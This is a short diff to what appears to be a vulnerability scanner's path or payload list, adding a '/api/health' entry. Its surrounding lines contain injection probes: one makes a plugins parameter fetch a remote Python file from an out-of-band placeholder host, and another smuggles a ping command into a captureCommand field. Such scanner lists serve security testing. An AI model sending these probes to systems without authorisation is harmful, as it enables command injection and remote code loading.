@@ -49,3 +49,4 @@
 /rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
 /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap
 /jmx-console/
+/api/health
